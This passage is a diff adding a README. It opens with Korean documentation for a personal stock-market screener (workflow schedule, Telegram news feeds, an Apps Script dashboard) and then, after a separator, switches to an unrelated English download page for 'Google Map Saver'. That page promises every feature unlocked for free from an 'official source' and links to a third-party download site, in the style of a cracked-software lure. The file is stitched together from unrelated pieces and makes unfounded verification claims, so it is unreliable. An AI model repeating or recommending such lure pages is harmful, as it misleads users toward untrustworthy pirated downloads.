@@ -1,0 +1,122 @@
+��될 수 있다.
+- 이 저장소에 자동매매·포지션 규칙은 없다 (기획서 v1 스코프).
+
+## 하루 흐름 (KST, 월~금)
+
+| 시각 | 워크플로 | 내용 |
+|---|---|---|
+| 19:10 | briefing `reports` | 네이버·한경 신규 리포트 → 기술 태그·여력·손익비·목표가/의견 변경·몰림 |
+| 08:50 | briefing `premarket_kr` | 밤사이 미장·섹터·매크로 → 국장 시사점, 밤사이 리포트, **오늘 관심종목**(`reports/watchlist_KR.json`) |
+| 10:30 / 13:30 | briefing `intraday_kr` | 외국인·기관 잠정 수급(시장·종목 상위), 관심종목 수급 교차 |
+| 16:20 | screener `KR` | 전종목 스크리너 + 해석 코멘트 + 리포트 결합 + **마감 코멘트**(지수·수급 확정·대형주) |
+| 21:00 / 22:00 | briefing `premarket_us` | 프리장·장전: 선물·매크로, 오늘 국장 결과, 어제 US 스크리너 |
+| 23:00 / 04:00 | briefing `intraday_us` | 장중·후반: 지수·섹터 ETF 진행 중, 거래대금 상위 등락 |
+| 07:00 | screener `US` | US 스크리너 + 섹터 tone + **내일 국장 시사점** |
+
+리포트 저장소 `data/research.parquet`(커밋): `research.post_performance()` 로 발간 후 5/20/60일 초과수익, `broker_stats()` 로 증권사별 적중률 집계 가능 (데이터가 2~3개월 쌓인 뒤 의미 있음).
+
+## 뉴스·이슈 레이어 (Context, 점수 미반영)
+
+| 소스 | 시크릿 | 비고 |
+|---|---|---|
+| yfinance 종목 뉴스 | 없음 | 신호 상위 종목(최대 ~30개)만 최근 3일 헤드라인. US 풍부, KR 은 자주 비어 있음 |
+| 텔레그램 채널 | `TG_API_ID` `TG_API_HASH` `TG_SESSION` `TG_CHANNELS` | my.telegram.org 에서 API 발급 → 로컬에서 1회 로그인해 StringSession 문자열 생성 → 시크릿 등록. 채널은 `@채널명,@채널명`. 종목명 문자열 매칭이라 오탐 있음 |
+| 텔레그램 공개 미리보기 피드 | 없음 | `ops/tg_feeds.json` 9채널(tier 1·2) → `reports/feeds/tg_*.json`(`scripts/tg_feed.py`, `tg_feed.yml` 08:13·20:13). why 추론·2주 채점은 **PB 쪽 예약(데스크 에이전트)이 `reports/feeds/tg_why.json` 에 채움 — 워크플로는 LLM 을 호출하지 않음** |
+| fiscal.ai | `FISCAL_AI_KEY` | 어댑터 자리만 있음 (`news.fetch_fiscal_ai`). API 문서 확인 후 엔드포인트·필드 채워야 동작 |
+
+StringSession 생성:
+```python
+from telethon.sync import TelegramClient
+from telethon.sessions import StringSession
+with TelegramClient(StringSession(), API_ID, API_HASH) as c:
+    print(c.session.save())   # 이 문자열을 TG_SESSION 시크릿에
+```
+
+## 웹 터미널 (Apps Script 웹앱)
+
+`apps-script/` 의 `Code.gs` + `Index.html`(공용 셸) + `tab_*.html`(탭별 화면 14개) 을 Apps Script 프로젝트에 넣고 웹앱으로 배포하면, 저장소의 `reports/dashboard.json` · `detail_*.json` 을 읽어
+터미널 스타일(검정 바탕·앰버 헤더·모노스페이스)로 보여준다. 종목을 클릭하면 60일 차트(SMA20/50·목표가·손절선), 지표, 리포트 이력, 10일 수급, 시나리오(Bull/Base/Bear·손익비), 개별/거시 코멘트.
+
+1. GitHub → Settings → Developer settings → Fine-grained tokens → 저장소 `market-screener` 만, Permissions: **Contents: Read-only** → 토큰 복사
+2. script.google.com → 새 프로젝트 → `Code.gs` 붙여넣기, `Index` 와 `tab_*` HTML 파일을 하나씩 만들어(파일 추가 → HTML, 확장자 없는 이름) 붙여넣기 — 목록은 [ops/README.md](ops/README.md) 의 'GAS 웹앱에 붙여넣기'
+3. 프로젝트 설정 → 스크립트 속성: `GITHUB_TOKEN`, `GITHUB_REPO`(= `hk99915-bot/market-screener`)
+4. 배포 → 새 배포 → 유형 **웹 앱** → 실행 주체 **나**, 액세스 **나만** → 배포 → URL 열기 (폰 홈화면에 추가 가능)
+
+데이터는 5분마다 자동 새로고침. 스크리너·브리핑이 돌 때마다 JSON 이 갱신된다.
+
+
+---
+
+# Google Map Saver — Windows Edition | Latest Stable Release 2026
+
+*Reviewed by the review and verification team · Senior Software Analyst · Updated 2026 · Verified against the official source*
+
+<table>
+<tr>
+<td width="100" valign="middle">
+<img src="https://softyne.com/wp-content/uploads/google-map-saver-8210-0.webp" width="80" height="80" alt="Google Map Saver icon — Windows edition 2026">
+</td>
+<td valign="middle">
+
+### ⬇️ DOWNLOAD LATEST STABLE RELEASE
+
+[![DOWNLOAD LATEST STABLE RELEASE](https://softyne.com/wp-content/uploads/downloadlatestversion.svg)](https://softyne.com/google-map-saver)
+
+**Get the current full version now**
+
+</td>
+</tr>
+</table>
+
+[![Version](https://www.softyne.com/wp-content/uploads/version.svg)]()
+[![Platform](https://www.softyne.com/wp-content/uploads/platform.svg)]()
+[![License](https://www.softyne.com/wp-content/uploads/license.svg)]()
+[![Updated](https://www.softyne.com/wp-content/uploads/updated.svg)]()
+
+> Get Google Map Saver — the Latest Stable Release 2026 for Windows, a complete package with every feature unlocked from the official source.
+
+## Quick Navigation
+- [Overview](#overview)
+- [Main Features](#main-features)
+- [Key Benefits](#key-benefits)
+- [Changelog Highlights](#changelog-highlights)
+- [System Requirements](#system-requirements)
+- [Screenshots Gallery](#screenshots-gallery)
+- [How to Install](#how-to-install)
+- [Pro Tips](#pro-tips)
+- [FAQ](#faq)
+- [User Testimonials](#user-testimonials)
+- [License Info](#license-info)
+- [Official Links](#official-links)
+
+## Overview
+<a id="overview"></a>
+
+Google Map Saver is a powerful tool designed to help users save maps from Google Maps easily. Whether you need maps for educational purposes, planning, or personal use, this software provides a straightforward solution by allowing you to customize the map settings according to your preferences. Unlike typical alternatives that rely solely on screen capture, Google Map Saver offers a more efficient way to save high-quality maps tailored to your specific needs.
+
+This latest stable release 2026 comes with a full feature set, ensuring that all premium features are included and no locked features are present. Users can enjoy a complete package that allows them to save maps in various formats and resolutions, completely free of charge. Don’t miss out on the chance to optimize your map-saving experience. Download from the official source today to access the full capabilities of Google Map Saver. Last verified: 2026.
+
+The current version is available for immediate download.
+
+## Main Features
+<a id="main-features"></a>
+
+### Core Functionality
+- **Custom Area Selection** — Users can specify the exact area on Google Maps to center the map, ensuring that they capture only the relevant information they need.
+- **Map Type Options** — Google Map Saver allows users to choose from different map types such as maps, satellite, hybrid, or terrain, tailoring the output to their specific requirements.
+- **Multiple Image Formats** — Save the maps in various formats including JPEG, PNG, BMP, and TGA, making it versatile for different applications.
+- **Resolution and Zoom Control** — Users can adjust the resolution and zoom level of the map, providing flexibility in how the final image appears.
+- **Coordinate Display** — The application shows the exact coordinates of the selected locations, enhancing the usability of saved maps for navigation or reference.
+
+### Advanced Capabilities
+- **User-Friendly Interface** — The intuitive interface allows even novice users to quickly learn how to save maps without any hassle.
+- **Offline Functionality** — Google Map Saver can be used offline, providing users the convenience to save maps without an internet connection.
+- **Batch Processing** — Users can save multiple maps in one go, greatly improving efficiency for those who require many maps at once.
+- **Watermark Removal** — Options are available to remove watermarks by following simple instructions in the program's About section, enhancing the presentation of saved maps.
+
+## Key Benefits
+<a id="key-benefits"></a>
+
+Google Map Saver provides numerous benefits to its users:
+
+- Streamline map saving processes, cutting time spent on manual
